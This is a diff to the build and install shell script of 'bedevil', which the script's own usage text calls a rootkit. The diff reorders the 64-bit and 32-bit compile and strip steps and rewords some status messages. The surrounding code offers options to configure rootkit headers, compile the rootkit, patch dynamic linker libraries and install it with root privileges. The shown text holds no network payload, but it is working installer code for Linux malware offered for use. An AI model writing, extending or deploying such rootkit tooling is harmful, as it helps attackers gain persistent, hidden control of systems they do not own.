@@ -74,15 +74,12 @@ compile_bdvl(){
 
     # only show gcc output if we want to output verbosely.
     [ $VERBOSE == 1 ] && `$compile_reg` || `$compile_reg &>/dev/null`
-    [ $VERBOSE == 1 ] && `$compile_m32` || `$compile_m32 &>/dev/null`
-
     strip $BDVLSO.$PLATFORM 2>/dev/null || { eecho "Couldn't strip $BDVLSO.$PLATFORM, exiting"; exit; }
-    strip $BDVLSO.i686 2>/dev/null || wecho "Couldn't strip $BDVLSO.i686, this is ok"
+    [ -f $BDVLSO.$PLATFORM ] && secho "`lib_size $PLATFORM`"
 
-    [ -f $BDVLSO.$PLATFORM ] && \
-        secho "`lib_size $PLATFORM`"
-    [ -f $BDVLSO.i686 ] && \
-        secho "`lib_size i686`"
+    [ $VERBOSE == 1 ] && `$compile_m32` || `$compile_m32 &>/dev/null`
+    strip $BDVLSO.i686 2>/dev/null || wecho "Couldn't strip $BDVLSO.i686, this is ok"
+    [ -f $BDVLSO.i686 ] && secho "`lib_size i686`"
 }
 
 install_bdvl(){
@@ -92,8 +89,8 @@ install_bdvl(){
     }
 
     secho "Starting full installation!\n"
-    wecho "Make sure any essential dependencies are installed."
-    wecho "You can do this with '$0 -D'"
+    wecho "Make sure any essential dependencies are present."
+    wecho "You can install them with '$0 -D'"
 
     local response="$(show_yesno "Patch dynamic linker libs?")"; echo
     if [ $response == 0 ]; then
@@ -142,7 +139,7 @@ USAGE="
           -C: Clean up installation/compilation mess.
           -d: Configure rootkit headers & settings.
           -z: After configuration has finished, compress the resulting
-              new include directory with gzip for faster future deployments.
+              new include directory with gzip.
           -c: Compile rootkit in current directory & exit.
           -D: Install all potential required dependencies. (REQUIRES ROOT)
           -i: Launch full installation of bedevil. (REQUIRES ROOT)
